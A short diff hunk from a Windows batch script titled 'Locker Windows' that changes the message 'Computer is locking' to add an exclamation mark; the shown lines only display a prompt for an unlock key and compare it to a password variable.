@@ -5,7 +5,7 @@ title Locker Windows
 color 04
 :unlock
 cls
-echo Computer is locking
+echo Computer is locking!
 echo.
 set /p unlock=Plese write key to unlock: 
 if %unlock% == %password% (
